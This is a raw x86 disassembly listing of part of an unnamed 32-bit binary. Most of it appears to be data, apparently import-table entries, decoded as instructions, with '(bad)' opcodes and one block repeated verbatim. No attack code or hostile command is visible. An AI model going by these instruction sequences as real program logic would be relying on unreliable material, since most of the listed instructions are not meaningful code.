  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [edx+edi*1+0x3],dl
  412427:	add    BYTE PTR [edx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
